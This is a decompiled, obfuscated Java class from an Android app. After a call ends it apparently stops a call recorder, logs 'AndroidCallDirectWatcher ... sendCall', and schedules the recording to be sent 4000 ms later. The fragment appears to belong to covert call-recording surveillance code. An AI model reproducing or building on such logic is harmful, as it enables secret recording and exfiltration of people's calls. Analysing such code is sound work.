package com.network.android;

import android.content.Context;
import android.os.Handler;
import com.network.android.c.a.a;
import com.network.media.r;

/* access modifiers changed from: package-private */
public final class b implements Runnable {

    /* renamed from: a  reason: collision with root package name */
    final /* synthetic */ Context f69a;
    final /* synthetic */ Handler b;
    final /* synthetic */ String c = null;

    b(Context context, Handler handler) {
        this.f69a = context;
        this.b = handler;
    }

    public final void run() {
        String str;
        if (r.b() != null) {
            r.b(this.f69a);
            str = r.a();
        } else {
            a.a("AndroidCallDirectWatcher stopRecord recorder == null");
            str = null;
        }
        a.a("AndroidCallDirectWatcher sendCall send call in(ms): 4000");
        this.b.postDelayed(new c(this), 500);
        this.b.postDelayed(new d(this, str), 4000);
    }
}
